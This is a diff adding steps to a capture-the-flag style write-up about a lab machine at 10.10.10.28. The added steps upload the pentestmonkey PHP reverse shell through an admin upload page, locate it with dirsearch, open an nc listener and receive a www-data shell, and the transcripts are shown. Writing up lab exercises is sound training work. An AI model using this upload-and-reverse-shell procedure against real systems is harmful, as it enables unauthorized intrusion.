@@ -10,6 +10,7 @@ tags:
   - nmap
   - pwd
   - BURP
+  - dirsearch.py
 ---
 
 Here are notes from the named target:
@@ -112,3 +113,61 @@ Now I wanty to try and upload a PHP reverse shell
 
 **Reverse Shell**
 Locate PHP reverse shell from http://pentestmonkey.net/tools/web-shells/php-reverse-shell
+
+Be sure to read what it does and update the IP and port. Save the PHP reverse shell (phpshell.php) and then upload it to the web page:
+
+Now that it is uploaded you have to find out where it was uploaded to so you can browse to it and cause it to fire off:
+
+Use *dirsearch.py*
+
+```yaml
+┌──(kali㉿kali)-[~/dirsearch]
+└─$ python3 dirsearch.py -e php -u http://10.10.10.28 --exclude-status 403,401                                                                   2 ⨯
+
+  _|. _ _  _  _  _ _|_    v0.4.1                                                                                                                     
+ (_||| _) (/_(_|| (_| )                                                                                                                              
+                                                                                                                                                     
+Extensions: php | HTTP method: GET | Threads: 30 | Wordlist size: 8853
+
+Error Log: /home/kali/dirsearch/logs/errors-20-12-31_12-22-28.log
+
+Target: http://10.10.10.28/                                                                                                                          
+                                                                                                                                                     
+Output File: /home/kali/dirsearch/reports/10.10.10.28/_20-12-31_12-22-28.txt
+
+[12:22:28] Starting: 
+[12:22:40] 301 -  308B  - /css  ->  http://10.10.10.28/css/                                                                             
+[12:22:42] 301 -  310B  - /fonts  ->  http://10.10.10.28/fonts/                                       
+[12:22:42] 301 -  311B  - /images  ->  http://10.10.10.28/images/  
+[12:22:43] 200 -   11KB - /index.php                                                                           
+[12:22:43] 200 -   11KB - /index.php/login/
+[12:22:43] 301 -  307B  - /js  ->  http://10.10.10.28/js/                                               
+[12:22:48] 301 -  311B  - /themes  ->  http://10.10.10.28/themes/                                                 
+[12:22:48] 301 -  312B  - /uploads  ->  http://10.10.10.28/uploads/                       
+                                                                                                
+Task Completed                                   
+```
+Before we can fire the reverse shell we have to open a listener and have it wait for the connection from the web server reverse shell:
+
+```yaml
+nc -nlvp 4321
+```
+Now we try to browse to the "/uploads/phpshell.php" - you will aslso ne to use the ID of the Super Admin in the BURP Proxy then click "Forward"
+
+**Got SHELL**
+
+```yaml
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 4321             
+listening on [any] 4321 ...
+connect to [10.10.14.87] from (UNKNOWN) [10.10.10.28] 51198
+Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 17:38:42 up 11:52,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ ls
+bin
+boot
+cdrom
+```
